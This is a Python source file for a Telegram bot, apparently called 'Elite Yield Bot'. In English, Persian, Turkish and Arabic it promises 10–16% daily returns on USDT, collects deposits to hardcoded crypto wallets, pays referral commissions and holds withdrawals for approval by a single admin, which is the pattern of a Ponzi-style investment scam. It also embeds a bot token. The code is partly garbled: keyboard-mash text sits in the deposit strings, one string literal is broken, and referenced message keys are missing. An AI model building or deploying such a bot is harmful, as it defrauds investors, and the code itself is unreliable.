import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import time  # اضافه شد!
import logging
from datetime import datetime

# تنظیم لاگینگ
logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# توکن و تنظیمات
BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

# آدرس والت
TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

# دیتابیس
conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Bronze',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en'
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
conn.commit()

# دیکشنری زبان‌ها (کامل, channel حذف)
languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 16% DAILY returns on your USDT investments! 💰

💎 Membership Levels:
• Bronze (10% daily) - $0-$99
• Silver (12% daily) - $100-$499  
• Gold (16% daily) - $500+

💳 Minimum deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance': """💰 Your Balance: ${balance:.2f} USDT
📈 Total Profit: ${total_profit:.2f} USDT
💎 Level: {level}""",
        'deposit_instructions': """💳 Deposit Instructions:

Send USDT to:
🌐 TRC20: `{d.,vm.d,d,fflkvmgklmlbgkmblg4gb4gb45}`
🌐 BEP20: `{BEP20_WALLET}`

Min $10. Confirm after sending.""",
        'enter_deposit_amount': 'Enter amount (min $10
        fgbvfgbdfg5fg5bf55fgb55):',
        'invalid_amount': '❌ Invalid! Min $10.',
        'enter_wallet': 'Enter wallet (TRC20/BEP20):',
        'withdraw_submitted': '✅ Submitted! Wait for admin.',
        'referral_text': """👥 Referral Link: `{ref_link}`
Referrals: {ref_count}
5% commission!""",
        'support': """📞 Support:
👤 Admin: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}""",
        'choose_language': 'Choose language:',
        'english': 'English 🇺🇸',
        'persian': 'Persian 🇮🇷',
        'turkish': 'Turkish 🇹🇷',
        'arabic': 'Arabic 🇸🇦'
    },
    'fa': {
        'welcome': """🌟 خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 16% روزانه روی سرمایه USDT خود را باز کنید! 💰

💎 سطوح عضویت:
• برنز (10% روزانه) - $0-$99
• نقره‌ای (12% روزانه) - $100-$499  
• طلایی (16% روزانه) - $500+

💳 حداقل واریز: 10$ USDT
🌐 شبکه‌ها: TRC20 یا BEP20

از امروز درآمد غیرفعال کسب کنید! 📈""",
        'balance': """💰 موجودی شما: ${balance:.2f} USDT
📈 سود کل: ${total_profit:.2f} USDT
💎 سطح: {level}""",
        'deposit_instructions': """💳 دستورالعمل واریز:

USDT را به:
🌐 TRC20: `{TRC20_WALLET}`
🌐 BEP20: `{BEP20_WALLET}`

حداقل 10$. پس از ارسال تأیید کنید.""",
        'enter_deposit_amount': 'مبلغ را وارد کنید (حداقل 10$):',
        'invalid_amount': '❌ نامعتبر! حداقل 10$.',
        'enter_wallet': 'آدرس والت وارد کنید (TRC20/BEP20):',
        'withdraw_submitted': '✅ ثبت شد! منتظر ادمین.',
        'referral_text': """👥 لینک رفرال: `{ref_link}`
رفرال‌ها: {ref_count}
5% کمیسیون!""",
        'support': """📞 پشتیبانی:
👤 ادمین: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}""",
        'choose_language': 'زبان انتخاب کنید:',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    },
    'tr': {
        'welcome': """🌟 Elite Yield Bot'a Hoş Geldiniz! 🚀

USDT yatırımlarınızda günlük %16'ya kadar getiri kilidini açın! 💰

💎 Üyelik Seviyeleri:
• Bronz (%10 günlük) - $0-$99
• Gümüş (%12 günlük) - $100-$499  
• Altın (%16 günlük) - $500+

💳 Minimum yatırım: $10 USDT
🌐 Ağlar: TRC20 veya BEP20

Bugün pasif gelir kazanmaya başlayın! 📈""",
        'balance': """💰 Bakiyeniz: ${balance:.2f} USDT
📈 Toplam Kar: ${total_profit:.2f} USDT
💎 Seviye: {level}""",
        'deposit_instructions': """💳 Yatırım Talimatları:

USDT'yi gönderin:
🌐 TRC20: `{TRC20_WALLET}`
🌐 BEP20: `{BEP20_WALLET}`

Min $10. Gönderdikten sonra onaylayın.""",
        'enter_deposit_amount': 'Miktarı girin (min $10):',
        'invalid_amount': '❌ Geçersiz! Min $10.',
        'enter_wallet': 'Cüzdan adresi girin (TRC20/BEP20):',
        'withdraw_submitted': '✅ Gönderildi! Admin bekleniyor.',
        'referral_text': """👥 Referans Linki: `{ref_link}`
Referanslar: {ref_count}
%5 komisyon!""",
        'support': """📞 Destek:
👤 Admin: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}""",
        'choose_language': 'Dil seçin:',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    },
    'ar': {
        'welcome': """🌟 مرحبا بك في Elite Yield Bot! 🚀

افتح عوائد يومية تصل إلى 16% على استثمارات USDT الخاصة بك! 💰

💎 مستويات العضوية:
• برونز (10% يومياً) - $0-$99
• فضي (12% يومياً) - $100-$499  
• ذهبي (16% يومياً) - $500+

💳 الحد الأدنى للإيداع: $10 USDT
🌐 الشبكات: TRC20 أو BEP20

ابدأ في كسب الدخل السلبي اليوم! 📈""",
        'balance': """💰 رصيدك: ${balance:.2f} USDT
📈 الربح الإجمالي: ${total_profit:.2f} USDT
💎 المستوى: {level}""",
        'deposit_instructions': """💳 تعليمات الإيداع:

أرسل USDT إلى:
🌐 TRC20: `{TRC20_WALLET}`
🌐 BEP20: `{BEP20_WALLET}`

الحد الأدنى $10. اضغط تأكيد بعد الإرسال.""",
        'enter_deposit_amount': 'أدخل المبلغ (حد أدنى $10):',
        'invalid_amount': '❌ غير صالح! حد أدنى $10.',
        'enter_wallet': 'أدخل عنوان المحفظة (TRC20/BEP20):',
        'withdraw_submitted': '✅ تم الإرسال! انتظر الإدارة.',
        'referral_text': """👥 رابط الإحالة: `{ref_link}`
الإحالات: {ref_count}
5% عمولة!""",
        'support': """📞 الدعم:
👤 الإدارة: {ADMIN_USERNAME}
🆔 ID: {ADMIN_ID}""",
        'choose_language': 'اختر اللغة:',
        'english': 'English 🇺🇸',
        'persian': 'فارسی 🇮🇷',
        'turkish': 'Türkçe 🇹🇷',
        'arabic': 'العربية 🇸🇦'
    }
}

def get_level(balance):
    if balance < 100:
        return 'Bronze', 0.10
    elif balance < 500:
        return 'Silver', 0.12
    else:
        return 'Gold', 0.16

def main_menu(is_admin=False, lang='en'):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_balance = KeyboardButton('💰 Balance')
    btn_deposit = KeyboardButton('💳 Deposit')
    btn_withdraw = KeyboardButton('💸 Withdraw')
    btn_referral = KeyboardButton('👥 Referral')
    btn_support = KeyboardButton('📞 Support')
    markup.add(btn_balance, btn_deposit)
    markup.add(btn_withdraw, btn_referral)
    markup.add(btn_support)
    
    if is_admin:
        btn_admin = KeyboardButton('🛠 Admin Panel')
        markup.add(btn_admin)
    return markup

def admin_menu(lang='en'):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_users = KeyboardButton('👥 Users List')
    btn_pending = KeyboardButton('⏳ Pending Requests')
    btn_stats = KeyboardButton('📊 Statistics')
    btn_back = KeyboardButton('🔙 Back to Main')
    markup.add(btn_users, btn_pending)
    markup.add(btn_stats, btn_back)
    return markup

def language_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    btn_en = InlineKeyboardButton(languages['en']['english'], callback_data='lang_en')
    btn_fa = InlineKeyboardButton(languages['en']['persian'], callback_data='lang_fa')
    btn_tr = InlineKeyboardButton(languages['en']['turkish'], callback_data='lang_tr')
    btn_ar = InlineKeyboardButton(languages['en']['arabic'], callback_data='lang_ar')
    markup.add(btn_en, btn_fa)
    markup.add(btn_tr, btn_ar)
    return markup

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    args = message.text.split()
    
    # چک referral
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        try:
            referrer_id = int(args[1].split('_')[1])
            if referrer_id != user_id:
                cursor.execute('UPDATE users SET referrer_id = ? WHERE user_id = ?', (referrer_id, user_id))
                conn.commit()
                bot.send_message(referrer_id, '🎉 New referral joined! You\'ll earn 5% commission on their deposits!')
        except Exception as e:
            logging.error(f'Referral error: {e}')
    
    # ایجاد/بروزرسانی کاربر
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
    except Exception as e:
        logging.error(f'DB error in start: {e}')
        result = None
    
    lang = result[0] if result else 'en'
    
    if not result:
        current_time = int(time.time())
        cursor.execute('INSERT INTO users (user_id, username, created_at, language) VALUES (?, ?, ?, ?)', (user_id, username, current_time, lang))
        conn.commit()
        logging.info(f'New user: {user_id} - {username}')
        bot.send_message(message.chat.id, languages['en']['choose_language'], reply_markup=language_menu())
        return
    
    cursor.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    conn.commit()
    
    is_admin = user_id == ADMIN_ID
    
    # تصویر بنر + خوش‌آمد
    try:
        with open('welcome_banner.jpg', 'rb') as banner:
            bot.send_photo(message.chat.id, banner, caption=languages[lang]['welcome'], reply_markup=main_menu(is_admin, lang))
    except FileNotFoundError:
        bot.send_message(message.chat.id, languages[lang]['welcome'], reply_markup=main_menu(is_admin, lang))

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_language(call):
    try:
        lang = call.data.split('_')[1]
        cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, call.from_user.id))
        conn.commit()
        bot.answer_callback_query(call.id, "Language set!")
        bot.edit_message_text("Language changed!", call.message.chat.id, call.message.message_id)
        start_message(call.message)
    except Exception as e:
        logging.error(f'Lang error: {e}')

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.from_user.id
    try:
        cursor.execute('SELECT balance, total_profit, level, language FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
    except Exception as e:
        logging.error(f'DB error in handle: {e}')
        user_data = None
    
    if user_data:
        balance, total_profit, level, lang = user_data
    else:
        balance, total_profit, level, lang = 0, 0, 'Bronze', 'en'
    
    is_admin = user_id == ADMIN_ID
    
    if message.text == '💰 Balance':
        text = languages[lang]['balance'].format(balance=balance, total_profit=total_profit, level=level)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == '💳 Deposit':
        msg = bot.send_message(message.chat.id, languages[lang]['enter_deposit_amount'])
        bot.register_next_step_handler(msg, process_deposit_amount)
    
    elif message.text == '💸 Withdraw':
        if balance < 5:
            bot.send_message(message.chat.id, languages[lang]['invalid_amount'], reply_markup=main_menu(is_admin, lang))
            return
        msg = bot.send_message(message.chat.id, languages[lang]['enter_amount'])
        bot.register_next_step_handler(msg, process_withdraw_request)
    
    elif message.text == '👥 Referral':
        ref_link = f't.me/eliteyieldbot?start=ref_{user_id}'
        try:
            cursor.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
            ref_count = cursor.fetchone()[0]
            conn.commit()
        except Exception as e:
            logging.error(f'Ref error: {e}')
            ref_count = 0
        text = languages[lang]['referral_text'].format(ref_link=ref_link, ref_count=ref_count)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang), parse_mode='Markdown')
    
    elif message.text == '📞 Support':
        text = languages[lang]['support'].format(ADMIN_USERNAME=ADMIN_USERNAME, ADMIN_ID=ADMIN_ID)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == '🛠 Admin Panel' and is_admin:
        try:
            cursor.execute('SELECT COUNT(*) FROM users')
            total_users = cursor.fetchone()[0]
            conn.commit()
        except Exception as e:
            logging.error(f'Admin error: {e}')
            total_users = 0
        text = languages[lang]['admin_panel'].format(total_users=total_users)
        bot.send_message(message.chat.id, text, reply_markup=admin_menu(lang))
    
    # اضافه کردن بقیه admin options با try/except مشابه
    
    else:
        bot.send_message(message.chat.id, 'Use menu.', reply_markup=main_menu(is_admin, lang))

def process_deposit_amount(message):
    try:
        amount = float(message.text)
        if amount < 10:
            bot.send_message(message.chat.id, languages['en']['invalid_amount'])
            return
        user_id = message.from_user.id
        lang = 'en'
        try:
            cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
            lang = cursor.fetchone()[0]
            conn.commit()
        except:
            pass
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton('📤 Confirm', callback_data=f'deposit_confirm_{user_id}_{amount}'))
        bot.send_message(message.chat.id, f"Confirm ${amount} deposit:", reply_markup=markup)
    except Exception as e:
        logging.error(f'Deposit amount error: {e}')
        bot.send_message(message.chat.id, 'Invalid number!')

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        data = call.data
        if data.startswith('deposit_confirm_'):
            parts = data.split('_')
            target_user_id = int(parts[2])
            amount = float(parts[3])
            try:
                cursor.execute('SELECT username FROM users WHERE user_id = ?', (target_user_id,))
                username = cursor.fetchone()[0]
                conn.commit()
            except:
                username = 'Unknown'
            
            current_time = int(time.time())
            cursor.execute('INSERT INTO pending_deposits (user_id, username, amount, created_at) VALUES (?, ?, ?, ?)',
                          (target_user_id, username, amount, current_time))
            deposit_id = cursor.lastrowid
            conn.commit()
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton('✅ Confirm', callback_data=f'admin_confirm_dep_{deposit_id}'),
                      InlineKeyboardButton('❌ Reject', callback_data=f'admin_reject_dep_{deposit_id}'))
            
            admin_msg = f"💳 New Deposit: User {username} (ID: {target_user_id})\nAmount: ${amount}"
            bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
            
            bot.answer_callback_query(call.id, "✅ Request sent!")
            bot.edit_message_text("✅ Submitted! Wait for admin.", call.message.chat.id, call.message.message_id)
        
        # بقیه callbackها با try
    except Exception as e:
        logging.error(f'Callback error: {e}')
        bot.answer_callback_query(call.id, "Error!")

# فرآیند برداشت (مشابه, با try)

def process_withdraw_request(message):
    try:
        amount = float(message.text)
        user_id = message.from_user.id
        try:
            cursor.execute('SELECT balance, username FROM users WHERE user_id = ?', (user_id,))
            user_data = cursor.fetchone()
            conn.commit()
        except:
            user_data = None
        
        if not user_data or amount > user_data[0] or amount < 5:
            bot.send_message(message.chat.id, languages['en']['invalid_amount'])
            return
        
        username = user_data[1]
        msg = bot.send_message(message.chat.id, languages['en']['enter_wallet'])
        bot.register_next_step_handler(msg, lambda m: process_withdraw_wallet(m, amount, username))
    except Exception as e:
        logging.error(f'Withdraw error: {e}')
        bot.send_message(message.chat.id, languages['en']['invalid_amount'])

def process_withdraw_wallet(message, amount, username):
    wallet_address = message.text
    user_id = message.from_user.id
    
    current_time = int(time.time())
    cursor.execute('INSERT INTO pending_withdraws (user_id, username, amount, wallet_address, created_at) VALUES (?, ?, ?, ?, ?)',
                  (user_id, username, amount, wallet_address, current_time))
    conn.commit()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('✅ Confirm', callback_data=f'admin_confirm_wd_{cursor.lastrowid}'),
              InlineKeyboardButton('❌ Reject', callback_data=f'admin_reject_wd_{cursor.lastrowid}'))
    
    admin_msg = f"💸 New Withdrawal: User {username} (ID: {user_id})\nAmount: ${amount}\nWallet: {wallet_address}"
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    bot.send_message(message.chat.id, languages['en']['withdraw_submitted'])

# اجرای ربات
if __name__ == '__main__':
    print("🚀 Elite Yield Bot starting...")
    bot.polling(none_stop=True)
